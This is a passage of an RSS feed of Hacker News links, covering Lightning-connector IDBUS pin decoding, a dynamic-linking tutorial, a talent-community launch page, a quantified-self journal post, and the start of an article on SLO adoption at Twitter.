                    <img src="https://nyansatan.github.io/lightning/resources/response_0x79.png"><br>

                    Some requests do not need a response though:

                    <img src="https://nyansatan.github.io/lightning/resources/request_0x84.png"><br>
                </p></div>

                <div>
                    <h2>Interpreting IDBUS requests and responses</h2><p>

                    The most important IDBUS request is <b>0x74</b> - it is used for two purposes: to tell HiFive enable full current (in case that's supported by an accessory) and to ask it about pin configuration the cable supports and some other metadata</p><p>

                    

                    Not too much is known about how response 0x75's data is encoded. But some bits were available in a certain old Tristar datasheet:</p><table>
                        <caption>First byte of 0x75 response data</caption>
                        <tbody><tr>
                            <th>7</th>
                            <th>6</th>
                            <th>5</th>
                            <th>4</th>
                            <th>3</th>
                            <th>2</th>
                            <th>1</th>
                            <th>0</th>
                        </tr>
                        <tr>
                            <td colspan="2">ACCx</td>
                            <td colspan="2">Dx</td>
                            <td colspan="4">DATA[43:40]</td>
                        </tr>
                    </tbody></table>

                    <br>

                    <div>
                        <table>
                            <caption>ACCx configuration when ID is found on ID0</caption>
                            <tbody><tr>
                                <th>ACCx[1:0]</th>
                                <th>ACC1</th>
                                <th>ACC2</th>
                                <th>HOST_RESET</th>
                            </tr>
                            <tr>
                                <td><b>00</b></td>
                                <td>Hi-Z (IDBUS)</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>01</b></td>
                                <td>UART1_RX</td>
                                <td>UART1_TX</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>10</b></td>
                                <td>JTAG_DIO</td>
                                <td>JTAG_CLK</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>11</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>HIGH</td>
                            </tr>
                        </tbody></table>
                    </div>

                    <br>

                    <div>
                        <table>
                            <caption>ACCx configuration when ID is found on ID1</caption>
                            <tbody><tr>
                                <th>ACCx[1:0]</th>
                                <th>ACC1</th>
                                <th>ACC2</th>
                                <th>HOST_RESET</th>
                            </tr>
                            <tr>
                                <td><b>00</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z (IDBUS)</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>01</b></td>
                                <td>UART1_RX</td>
                                <td>UART1_TX</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>10</b></td>
                                <td>JTAG_DIO</td>
                                <td>JTAG_CLK</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>11</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>HIGH</td>
                            </tr>
                        </tbody></table>
                    </div>

                    <br>

                    <div>
                        <table>
                            <caption>Dx configuration when ID is found on ID0</caption>
                            <tbody><tr>
                                <th>Dx[1:0]</th>
                                <th>DP1</th>
                                <th>DN1</th>
                                <th>DP2</th>
                                <th>DN2</th>
                            </tr>
                            <tr>
                                <td><b>00</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>01</b></td>
                                <td>USB0_DP</td>
                                <td>USB0_DN</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>10</b></td>
                                <td>USB0_DP</td>
                                <td>USB0_DN</td>
                                <td>UART1_TX</td>
                                <td>UART1_RX</td>
                            </tr>
                            <tr>
                                <td><b>11</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                            </tr>
                        </tbody></table>
                    </div>

                    <br>

                    <div>
                        <table>
                            <caption>Dx configuration when ID is found on ID1</caption>
                            <tbody><tr>
                                <th>Dx[1:0]</th>
                                <th>DP1</th>
                                <th>DN1</th>
                                <th>DP2</th>
                                <th>DN2</th>
                            </tr>
                            <tr>
                                <td><b>00</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>01</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>USB0_DP</td>
                                <td>USB0_DN</td>
                            </tr>
                            <tr>
                                <td><b>10</b></td>
                                <td>USB0_DP</td>
                                <td>USB0_DN</td>
                                <td>UART1_TX</td>
                                <td>UART1_RX</td>
                            </tr>
                            <tr>
                                <td><b>11</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                            </tr>
                        </tbody></table>
                    </div>
                    <p>

                    Using the tables above let's decode our cable's ID (<span>10 0C 00 00 00 00</span>) with keeping in mind that ID line was found on ID0 pin:<br>

                    h
                    </p><table>
                        <caption>First byte of the cable's 0x75 response data</caption>
                        <tbody><tr>
                            <th>7</th>
                            <th>6</th>
                            <th>5</th>
                            <th>4</th>
                            <th>3</th>
                            <th>2</th>
                            <th>1</th>
                            <th>0</th>
                        </tr>
                        <tr>
                            <td colspan="2">ACCx</td>
                            <td colspan="2">Dx</td>
                            <td colspan="4">DATA[43:40]</td>
                        </tr>
                        <tr>
                            <td>0</td>
                            <td>0</td>
                            <td>0</td>
                            <td>1</td>
                            <td>0</td>
                            <td>0</td>
                            <td>0</td>
                            <td>0</td>
                        </tr></tbody></table>
    
                    <p>

                    So, ACCx is <span>00</span> meaning that ID0 pin will just stick with IDBUS, and Dx is <span>01</span> meaning that DP1/DN1 pins will be configured as USB0_DP/USB0_DN. Just …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://nyansatan.github.io/lightning/">https://nyansatan.github.io/lightning/</a></em></p>]]>
            </description>
            <link>https://nyansatan.github.io/lightning/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23705546</guid>
            <pubDate>Wed, 01 Jul 2020 19:37:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dynamic Linking]]>
            </title>
            <description>
<![CDATA[
Score 46 | Comments 9 (<a href="https://news.ycombinator.com/item?id=23704160">thread link</a>) | @azhenley
<br/>
July 1, 2020 | https://blog.stephenmarz.com/2020/06/22/dynamic-linking/ | <a href="https://web.archive.org/web/*/https://blog.stephenmarz.com/2020/06/22/dynamic-linking/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
								
								<div>
									
<p>Static vs dynamic linking usually has to do with our tolerance for the size of our final executable. A<em> static </em>executable contains all code necessary to run the executable, so the operating system loads the executable into memory, and it’s off to the races. However, if we keep duplicating code over and over again, such as printf, then it starts to use up more and more space. So, a <em>dynamic</em> executable means that we only store <em>stubs</em> in the executable. Whenever we want to access printf, it goes out to a <em>dynamic linker</em> and loads the code essentially <em>on demand</em>. So, we sacrifice a tiny bit of speed for a much smaller executable.</p>



<hr>



<h2>Contents</h2>



<ol><li><a href="#linking">What is Linking</a></li><li><a href="#finding">Finding Symbols</a></li><li><a href="#static">Static Libraries (archives)</a></li><li><a href="#dynamic">Dynamic Libraries (shared objects)</a></li><li><a href="#analyze">Analyzing a Shared Program</a></li><li><a href="#unresolved">Unresolved Symbols at Run Time</a></li><li><a href="#plt">Procedure Linkage Table (plt)</a></li><li><a href="#got">Global Offset Table (got)</a></li><li><a href="#updating-got">Loading and Updating the GOT</a></li><li><a href="#conclusion">Conclusion and Further Reading</a></li><li><a href="#video">Video</a></li></ol>



<hr>



<h2 id="linking">What is Linking?</h2>



<p>When I hear someone talk about <em>compiling</em> their program into an executable, they are really eliding over several stages. The definition of  compiling is to <em>produce something by combining information collected from different sources.</em> In computing, we generally think of compiling as turning a higher-level language, such as C, into a lower-level code, such as assembly.</p>



<p>The final stage before we get an executable is the <em>linking</em> stage. This is where we <em>link</em> (hence the name) all sources together to produce one coherent executable. This is also where all outstanding symbols need to be resolved. Symbol is just fancy for the name of a function or global variable.</p>



<p>We can take a look at <em>object code, </em>which is what we get after we assemble but before we link. Here’s an object dump of an example program.</p>



<pre data-enlighter-language="c" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
void some_func(int a, int b);

int main(int argc, char *argv[]) {
	if (argc &lt; 3) {
		printf("Not enough arguments.\n");
		return -1;
	}

	int a = atoi(argv[1]);
	int b = atoi(argv[2]);

	some_func(a, b);

	return 0;
}</pre>



<p>This code produces the following object code, which I disassemble using objdump for RISC-V.</p>



<div><figure><img src="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-23.png" alt="" width="500" height="341" srcset="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-23.png 667w, https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-23-300x204.png 300w" sizes="(max-width: 500px) 100vw, 500px"></figure></div>



<p>Notice that the function some_func has been prototyped, but has not been defined. This will be the responsibility of the linker to find the symbol some_func and add it into our program. Notice what happens when I try to link this program without ever defining some_func.</p>



<pre>/opt/riscv_1/lib/gcc/riscv64-unknown-linux-gnu/9.2.0/../../../../riscv64-unknown-linux-gnu/bin/ld: /tmp/ccmgFc75.o:
<br>
in function .L2': test.c:(.text+0x62): undefined reference to some_func'
<br>
collect2: error: ld returned 1 exit status</pre>



<p>The linker is looking for the symbol some_func, but it cannot find it, so we get an <em>undefined reference</em>. We know this is at the linker stage because the error is “ld returned 1 exit status”. The “ld” means “linker”.</p>



<p>We also can see that the address of the function main is 0, this is because we haven’t linked a program. So, our object code just contains <em>bubbles</em> of code, which will then be placed into our executable at certain locations by the linker.</p>



<hr>



<h2 id="finding">Finding Symbols</h2>



<p>If we use the command <em>nm</em>, which is used to list symbols in an object file, we can see all of the <em>unresolved</em> symbols. Our object code is looking for these, but it doesn’t need to know where they are until we have a full executable program.</p>



<div><figure><img src="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-24.png" alt="" srcset="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-24.png 317w, https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-24-300x169.png 300w" sizes="(max-width: 317px) 100vw, 317px"></figure></div>



<p>You can see that in this object file, the linker has a little bit of work to do. It must find atoi, puts, and some_func, which are flagged as U for undefined symbols. When we execute the linker, we will specify certain libraries, such as -lc (the C library), which most of these symbols will be found. Our some_func has never been defined, so our linker cannot really succeed until we define it somewhere.</p>



<hr>



<h2 id="static">Static Libraries (archives)</h2>



<p>Archive files generally end in .a and contain code and other information that will be added to the final executable. Essentially, archive files are just a collection of object files into one file. Therefore, when we link to an archive file, we extract the actual code from the object code into our executable. The nice thing about archive files is that we don’t need to add ALL symbols into our executable–we only need those symbols that need to be used.</p>



<p>Usually, we have archive versions of all libraries to allow for <em>static</em> executables. These executables are those that don’t need any additional loading to run. In other words, these are self-contained files. The linker stage will pull in the code directly from the .a file into the executable, and all is done. The more code that the linker pulls in, the larger the executable will be.</p>



<p>Let’s go ahead and define some_func and see how linking works.</p>



<pre data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">#include &lt;stdio.h&gt;

void some_func(int a, int b)
{
	printf("Data = %d\n", a * b);
}
</pre>



<p>It’s very simple, but the point is to have some code that the linker can pull in. Recall that the linker gave us an “undefined reference” error because we didn’t define some_func. Now, we have it defined, so let’s see what happens.</p>



<pre>riscv64-unknown-linux-gnu-gcc -static -o test test2.o test.o</pre>



<p>Notice that I’m using gcc still. This will automatically invoke the linker and pull in the necessary <em>start files</em>. If we invoke the linker directly, we have to define _start and tell the program how to start, or we would have to directly specify the start files.</p>



<p>I specify -static so that gcc will pull in only .a files. When we are done, the file <em>test</em> will be a fully-contained, static executable. If we take a look at this file, we can see that all of the “stuff” we need for this executable makes it a fairly large file.</p>



<pre>-rwxr-xr-x 1 smarz smarz 4687920 Jun 1 09:16 test</pre>



<p>Yes, that’s 4,687,920 bytes or about 4.7 megabytes. However, if we looked at the symbol table, we will find that NO symbol is unresolved, and therefore this is a self contained executable. If we load this with our elf loader, no external resources will need to be pulled in.</p>



<p>Our linker must exhaustively follow every possible route and pull in those symbols even though they may never be called. We can see the symbol table is enormous due to all of the calls and global variable (such as errno).</p>



<pre>00000000000101b0 T abort<br>000000000006bb38 S __abort_msg<br>0000000000029aa8 t add_alias2.isra.0.part.0<br>00000000000497c6 t add_fdes<br>00000000000297ea t add_module.isra.0<br>000000000003aa4e t add_name_to_object.isra.0<br>000000000003ab5c t add_path.isra.0.constprop.0<br>000000000006b8d0 d adds.8114<br>000000000002fe2e T __add_to_environ<br>00000000000431b6 t add_to_global<br>000000000001adb4 t adjust_wide_data<br>000000000006bba0 V __after_morecore_hook<br>0000000000012d3a t alias_compare<br>000000000002338a W aligned_alloc<br>000000000006bb80 s aligned_heap_area<br>000000000003ff04 t allocate_dtv<br>000000000003a40c T __alloc_dir<br>000000000006ca38 b any_objects_regis</pre>



<hr>



<h2 id="dynamic">Dynamic Libraries (shared objects)</h2>



<p>Dynamic libraries end in .so, which stands for <em>shared object</em>. These libraries contain code that will not be added directly into the executable. Instead a program called the <em>dynamic linker</em> will be responsible for taking code from the .so files and adding them into an executing program. We can also add symbols ourselves using the -ldl (dynamic linker) library.</p>



<p>We can think of the term <em>dynamic</em> as <em>run-time</em>. That is, we don’t actually load the code into our program until the program actually runs. We can see this with something as simple as printf. We can examine our executable and we don’t see printf’s code. Instead, we see printf’s <em>stub</em>. This stub will then be replaced by the dynamic loader when the program executes.</p>



<p>When we link with a dynamic, shared object, those symbols that can be added at run time will remain unresolved. We will have the symbols’ names put into a table just so we know it’s out there somewhere. However, with shared objects, we now can get that <em>unresolved reference</em> (or symbol) at run-time! If you have arch-linux and have ever compiled anything yourself, you might’ve run into this phenomenon.</p>



<hr>



<h2>Making a Shared Library</h2>



<p>Let’s go ahead and turn our test2 file into a shared object. This is fairly easy to do with gcc:</p>



<pre>riscv64-unknown-linux-gcc -fPIC -shared -o libtest2.so test2.o</pre>



<p>The switch -fPIC stands for <em>position independent code</em>. That means all offsets cannot be relative outside of the library itself, and this is usually the case for most shared libraries. In this case, the generated code will be placed into a table to find the offsets. This is required since the library, or specific symbols in the library, can be loaded into any location by the dynamic linker.</p>



<p>Then, we can compile our test program to link to this shared library:</p>



<pre>riscv64-unknown-linux-gcc -o test test.o -L. -ltest2</pre>



<p>In the command above, I am specify the library search path with -L, so -L. means to look in the current directory. Then, I specify the library to link with using -ltest2. GCC will automatically prepend lib and append .so to make libtest2.so.</p>



<hr>



<h2 id="analyze">Analyzing A Shared Program</h2>



<p>First, we compile in the location of our library. We can see these shared libraries using the ldd command.</p>



<pre>smarz@DOMO:~ $ ./test<br>
./test: error while loading shared libraries: libtest2.so: cannot open shared object file: No such file or directory</pre>



<p>So, when I run my program, it looks at a certain path to find your libraries. This is analogous to the PATH environment variable, except in Linux (and some UNIXes), we use LD_LIBRARY_PATH. Shown below, if I change my path so the dynamic linker can find my library, it functions properly:</p>



<pre>smarz@DOMO:~ $ LD_LIBRARY_PATH=/home/smarz ./test 10 20<br>
Data = 200</pre>



<hr>



<h2 id="unresolved">Unresolved at Run Time</h2>



<p>When we link a program, many of the symbols will remain unresolved. This tells us what symbols the dynamic linker is responsible for loading from the shared objects (libraries). We can see these unresolved symbols using the nm command:</p>



<div><figure><img src="https://blog.stephenmarz.com/wp-content/uploads/2020/06/image.png" alt="" width="544" height="276" srcset="https://blog.stephenmarz.com/wp-content/uploads/2020/06/image.png 544w, https://blog.stephenmarz.com/wp-content/uploads/2020/06/image-300x152.png 300w" sizes="(max-width: 544px) 100vw, 544px"><figcaption>Partial list of symbols in our test program</figcaption></figure></div>



<p>You can see that puts is unresolved (capital U letter), …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.stephenmarz.com/2020/06/22/dynamic-linking/">https://blog.stephenmarz.com/2020/06/22/dynamic-linking/</a></em></p>]]>
            </description>
            <link>https://blog.stephenmarz.com/2020/06/22/dynamic-linking/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23704160</guid>
            <pubDate>Wed, 01 Jul 2020 17:35:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Launch HN: Contrary Talent]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 2 (<a href="https://news.ycombinator.com/item?id=23704004">thread link</a>) | @whrobbins
<br/>
July 1, 2020 | https://contrarycap.com/talent | <a href="https://web.archive.org/web/*/https://contrarycap.com/talent">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><p><a href="https://contrarycap.com/"><img src="https://contrarycap.com/images/horizontal-color@3x.svg"></a></p></div></div><div><div><p><a href="https://contrarycap.com/"><img src="https://contrarycap.com/images/horizontal-color@3x.svg"></a></p></div></div><div><div><div><h2>Top Talent Starts Here.</h2><div><p><strong>Contrary Talent</strong> is a select, diverse community of the top early-career engineers, designers, and product minds working in technology. </p><p>Members get lifetime access to exclusive job opportunities, funding when they start companies, mentorship from industry leaders, and much more.</p></div><p><a href="https://contrarycap.com/talent/join">Request an Invite</a></p></div></div><div><p><img src="https://contrarycap.com/images/talent/bracket.svg"></p><div><div><div><p><img src="https://contrarycap.com/images/talent/circle-1.svg"></p><div><h3>Get Referred.</h3><p>Get a referral from an existing member or request an invitation <a href="https://contrarycap.com/talent/join">here.</a></p></div></div></div><div><div><p><img src="https://contrarycap.com/images/talent/circle-2.svg"></p><div><h3>Get Selected.</h3><p>We interview and select the top early-career talent across North America to join.</p></div></div></div><div><div><p><img src="https://contrarycap.com/images/talent/circle-3.svg"></p><div><h3>Get Access.</h3><p>Whether you’re starting a company, catching up with old friends at Retreat, or just need help negotiating a raise, we support our members for life.</p></div></div></div></div></div><div><div><div><div dir="ltr"><div><div><div data-index="0" tabindex="-1" aria-hidden="false"><div><div tabindex="-1"> <p><img src="https://contrarycap.com/images/talent/slides/slide-capital.png"><img src="https://contrarycap.com/images/talent/slides/slide-capital-mobile.png"></p></div></div></div></div></div></div></div></div></div><div><div><div><div><p>If you're a recruiter, founder, or investor, get connected with our Talent Community.</p><p><a href="https://contrarycap.com/cdn-cgi/l/email-protection#a4d0c5c8c1cad0e4c7cbcad0d6c5d6ddc7c5d48ac7cbc9">Connect with us</a></p></div><div><p>If you're looking for your next role, view opportunities we’ve hand-picked on Startup Search.</p><p><a href="https://airtable.com/shrMs8at2arS8ulqA" target="_blank">Explore Roles</a></p></div></div></div></div></div><div><p><a href="https://contrarycap.com/"><img src="https://contrarycap.com/images/horizontal-color@3x.svg"></a></p><h4>SAN FRANCISCO, CA</h4><p>© 2020 Contrary Capital Management II LLC</p></div></div></div></div>]]>
            </description>
            <link>https://contrarycap.com/talent</link>
            <guid isPermaLink="false">hacker-news-small-sites-23704004</guid>
            <pubDate>Wed, 01 Jul 2020 17:21:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Examining Your Life]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 2 (<a href="https://news.ycombinator.com/item?id=23702985">thread link</a>) | @mtsolitary
<br/>
July 1, 2020 | http://mtsolitary.com/journal/xxx.html | <a href="https://web.archive.org/web/*/http://mtsolitary.com/journal/xxx.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      


  <p><img src="http://mtsolitary.com/assets/img/tableau.jpg"></p><p>This is a photograph of spring in Tel Aviv, into which I emerged from the coronavirus lockdown a little bleary-eyed and with a newfound addiction to chocolate <a href="https://en.wikipedia.org/wiki/Krantz_cake"><em>krantz</em></a> yeast cakes.</p>

<hr>

<h2 id="1-examining-your-life">1. Examining your life</h2>

<blockquote>
  <p>The unexamined life is not worth living.</p>
</blockquote>

<p>I’ve always been drawn to this quote, usually attributed to Socrates. The original <a href="https://en.wikipedia.org/wiki/The_unexamined_life_is_not_worth_living">meaning</a> of the quote is to emphasise the need for a personal philosophy, a way of thinking about yourself, that uses reflection to build a better future self through reference to and critique of the past self. Today, the quote brings to my mind the <a href="https://en.wikipedia.org/wiki/Quantified_self">quantified self movement</a>, a group of people who are devoted to the idea of collecting information about themselves, reviewing it and drawing insights from it to improve, or at the very least understand, their lives.</p>

<p>I’m not sure what Socrates would have to say about this modern “data-driven” philosophy, but I have become more and more drawn to the idea over the past couple of years. I thought it might be interesting to share some of the things I’ve noticed over the last five hundred days about myself, in the hope that this might inspire others to consider paying closer attention to their lives. There’s another reason for sharing too: I think there is a certain aesthetic value inherent in the topology of life one can see writ in the charts, the moving of a line along the page tracing some weird average of the thousands of variables that make up a day in anyone’s life that nonetheless contains some sort of signal.</p>

<h3 id="sleep">Sleep</h3>

<p>The older I become the more convinced I am that sleep is one of the most important, perhaps the single most important, factor in remaining balanced, peaceful and energetic throughout the day. The chart below shows the hours I slept every night, together with a moving 7-day average, over the last five hundred days. I don’t use any fancy sleep trackers, I just write down in a spreadsheet every morning how many hours I slept the previous night.</p>

<p><img src="http://mtsolitary.com/assets/img/sleep.png" alt="Sleep"></p>

<p>There are several periods of my life which are clearly visible on this graph. The most striking is the birth of my son, in February this year, following which there were understandably a few weeks of very little sleep. There are periods of greatly increased variation around holidays I took. And at the beginning of the COVID-19 lockdown I used the time I saved not commuting to and from work every day to catch up on some of that sleep I lost in February.</p>

<h3 id="alcohol">Alcohol</h3>

<p>The quantified self movement is convinced that sleep, alcohol, other drugs and caffeine (in that order usually) have the biggest overall impact on mood and general contentment in life. I track all of these metrics, and when I looked at the plots I generated I wondered whether I really wanted to share the graph below, in which a black bar represents a day on which I consumed alcohol over the last five hundred days.</p>

<p><img src="http://mtsolitary.com/assets/img/alcohol.png" alt="Alcohol"></p>

<p>It’s pretty clear from the graph above that I drink too frequently (I thought about colouring the bars by the number of drinks, which I also track but ultimately went for the simpler version). I also notice the correlation between consecutive drinking days (usually a beer or two or a glass of wine in the evening) and stressful periods in my life.</p>

<h3 id="work">Work</h3>

<p>While I was writing <a href="http://mtsolitary.com/journal/xxvii.html">XXVII</a> and <a href="http://mtsolitary.com/journal/xxviii.html">XXVIII</a> I was looking for a metric that shows a visible effect of the COVID-19 lockdown and the best one I could find is of my daily working hours (these are the hours between the time I count myself as starting work and the time I count myself as finishing, so they include time like lunchbreaks, coffee and chatting in the office when I wasn’t strictly-speaking “working”. I use <a href="http://rescuetime.com/">Rescuetime</a> to track actual bum-in-seat computer time at work but I think that’s a less interesting chart).</p>

<p><img src="http://mtsolitary.com/assets/img/work_dur.png" alt="Work"></p>

<p>I like the healthy amounts of vacation time, and on second thoughts I think the effect visible from February (after my return from a too-short paternity leave) is probably more to do with being a first-time parent than the lockdown <em>per se</em>.</p>

<h3 id="anxiety">Anxiety</h3>

<p>The holy grail of self-tracking, of the reflective data scientist, is an answer to the question “am I happy” based on actual data from your life. For me the answer to the question “am I happy” on a day-to-day basis can be approximated with the answer to the question “how anxious am I feeling today”, and to that end I tried my best to track my general mood and feeling of contentment (10) or anxiety (0) at three points throughout the last five hundred days.</p>

<p><img src="http://mtsolitary.com/assets/img/mood.png" alt="Mood"></p>

<p>Notwithstanding the concerns about the accuracy of the data the way I collected it (upon reflection the morning after, all three data points for the previous day at the same time, and with vague definitions of the cutoffs between the three sections of the day) this is a really interesting graph to look at over a timescale like this. My favourite feature of the graph is the easily visible section in June 2019 where my evening mood is vastly better than my day and morning mood; this is because I was on holiday with my friends and in the days recovering from the hangovers caused by the evenings. There’s also the rise to almost universal happiness around the birth of my son and the accompanying few weeks of time at home, before the uncertainty and panic around COVID-19 in mid-March put an end to that.</p>

<p>I noticed that there was something interesting about this graph when I looked at it during an “end-of-year review” process at the end of 2019, so I decided to start tracking a few more metrics related to anxiety. The most interesting, and most striking I think, is the “state of my fingernails”. It’s a simple 0-10 scale.</p>

<p><img src="http://mtsolitary.com/assets/img/nails.png" alt="Fingernails"></p>

<p>I’m not very proud of it, but I’ve been biting my fingernails for as long as I can remember. It’s absolutely a manifestation of anxiety and tension and I’m very aware that during difficult or stressful periods of my life I bite my fingernails more. It’s a habit that I would very much like to be rid of and I hope that understanding it is the first step to being free of it.</p>

<hr>

<p>Of course, none of this means anything if you don’t have the ability and the drive to actually act on the things you observe. That’s the next step for me, to try and <em>improve</em> the metrics in these graphs over time, to use my synthesised understanding of my past to influence the topology of these graphs in the future. Maybe that’s just a long-winded way of saying “examining yourself”: looking at yourself critically and trying to do better, or at the very least understand when you could do better and why you didn’t. I hope this post will go some way to making me accountable to myself, and hope to revisit these metrics and whichever new ones I start collecting throughout my life once a year to see how things are going.</p>

<h2 id="2-reading-watching-and-listening">2. Reading, watching and listening</h2>

<h4 id="reading">Reading</h4>
<ul>
  <li><a href="https://amzn.to/3frwuhU">Lost Connections</a> by Johann Hari, which has got a lot of buzz in the last couple of years as offering a groundbreaking new way of looking at depression and anxiety. I found this book really interesting and it challenged a lot of the things I think about the way society works and whether everything really needs to be the way it is. I recommend it thoroughly.</li>
  <li>This <a href="https://arxiv.org/pdf/2006.03511.pdf">article</a> on using unsupervised learning to translate between programming languages.</li>
  <li><a href="https://quantum.country/qcvc">This</a> very readable introduction to quantum computing (requires at least a first-year undergraduate maths background but is very well-written and accessible).</li>
</ul>

<h4 id="watching">Watching</h4>
<ul>
  <li><em>Peep Show</em>, Season 1. One of the greatest shows of all time.</li>
  <li><em>Seinfeld</em>, Season 5. Classics all round.</li>
  <li><a href="https://www.youtube.com/watch?v=Wf4cea5oObY">John Oliver</a>, fantastic as always, this time about the civil unrest in the United States in reaction to police violence and what “defund the police” actually means.</li>
</ul>

<h4 id="listening">Listening</h4>
<ul>
  <li><strong>The new:</strong> <em>RTJ4</em> by Run the Jewels.</li>
  <li><strong>The old:</strong> <em>Ohio</em> by Crosby, Stills, Nash and Young.</li>
  <li><strong>The choon:</strong> <em>Gospel for a New Century</em> by Yves Tumor.</li>
</ul>



<p><span>
  
  
  June
  30th,
  2020
</span>



    </p></div></div>]]>
            </description>
            <link>http://mtsolitary.com/journal/xxx.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23702985</guid>
            <pubDate>Wed, 01 Jul 2020 16:02:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SLO Adoption at Twitter]]>
            </title>
            <description>
<![CDATA[
Score 72 | Comments 4 (<a href="https://news.ycombinator.com/item?id=23702876">thread link</a>) | @hannahblameless
<br/>
July 1, 2020 | https://www.blameless.com/blog/slo-adoption-twitter | <a href="https://web.archive.org/web/*/https://www.blameless.com/blog/slo-adoption-twitter">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><br><em>This is the second article of a two-part series. Click </em><a href="http://www.blameless.com/blog/twitters-reliability-journey"><em>here</em></a><em> for part 1 of the interview with Brian, Carrie, JP, and Zac to learn more about </em><a href="https://www.blameless.com/blog/twitters-reliability-journey"><em>Twitter’s SRE journey</em></a><em>.</em><br></p><p><a href="https://www.blameless.com/blog/twitters-reliability-journey">Previously</a>, we saw how SRE at Twitter has transformed their engineering practice to drive production readiness at scale. The concept of service level objectives (SLOs) and error budgets have been key to this transformation, as SLOs shape an organization’s ability to make data-oriented decisions around reliability. (Read <a href="https://www.blameless.com/how-slos-transformed-evernote/">here</a> for a definition of SLOs and how they transformed Evernote). Today, the Twitter team has invested in centralized tooling to measure, track, and visualize SLOs and their corresponding error budgets.&nbsp;<br></p><p>However, successfully implementing SLOs is far easier said than done. Many organizations have struggled with adoption for a number of reasons. Common obstacles include getting stakeholder buy-in, not knowing what (and how) to measure, and confusion over how to make SLOs actionable.&nbsp;&nbsp;<br></p><p>While the Twitter engineering team had laid a very strong foundation around observability and reliability, it took several important breakthroughs before SLOs began achieving broader adoption within the organization and the journey continues.<br></p><h3>The foundations for SLO</h3><p>Prior to SLOs, the engineers had used service level indicators (SLIs) for many years.&nbsp; The SLIs drew from Twitter’s extensive instrumentation of infrastructure and investments in their observability stack. Their observability stack provided a foundation for measuring service health with indicators such as success rate, latency, and throughput across their distributed service ecosystem. For example, the team would monitor the success rate for user-facing HTTP services, which they computed by looking at HTTP 500 errors versus total requests.&nbsp;<br></p><p>Integrating the SLIs with alerts and on-call rotations had been a core practice within their engineering teams for years.&nbsp; Additionally, their focus on incident management and postmortems has enabled them to continuously learn from their always evolving production ecosystem.<br></p><p>A significant inflection point came with embedding the concept of SLO within <a href="https://twitter.github.io/finagle/">Finagle</a>, Twitter’s RPC library, which is maintained by the Core Systems Libraries (CSL) team. As mentioned in the previous post, Finagle delivers reliability features such as load balancing, circuit breakers, failure detectors, and more, filling them inside every single piece of software that runs. In 2018, the CSL team made SLOs a first-class entity in the Twitter internal version of Finagle, creating a foundational API building block that is tied to a service boundary, which they call an objective. This was transformative in that it allowed the team to begin defining service-to-service interactions and modeling beyond just an alert, creating a programmatic definition that the team could now use to inform runtime decisions.&nbsp;<br></p><p>The Twitter team supported the implementation with proposals for projects and use cases that could use the SLO feature, and initially delivered the configuration as well as realtime per-instance measurement of SLOs.&nbsp;&nbsp;<br></p><p>In its initial phases, adoption of the feature was limited. Service owners could configure SLOs, but due to a lack of tooling and benefits automatically associated with turning SLOs on, there was little incentive to do so in context of other priorities.<br></p><p>Seeing this, the team invested in follow-up work. They began to build integrations and solutions for service owners on top of SLOs, such as load-shedding based on SLOs as they provided more useful context than a related metric like CPU throttling. Through piloting such enhancements, the appetite for adoption began to increase.&nbsp;<br></p><h3>Defining SLOs</h3><p>In thinking about how to define SLOs, the Twitter team typically begins by considering which features are key, and ensuring that they're well instrumented and understood.<br></p><p>It’s important to identify the signals that best reflect a critical user experience. Some signals for service success rate can provide color but are not so straightforward to interpret. For example, in analyzing the service error rate inside the data center, the client might retry those requests, making it a 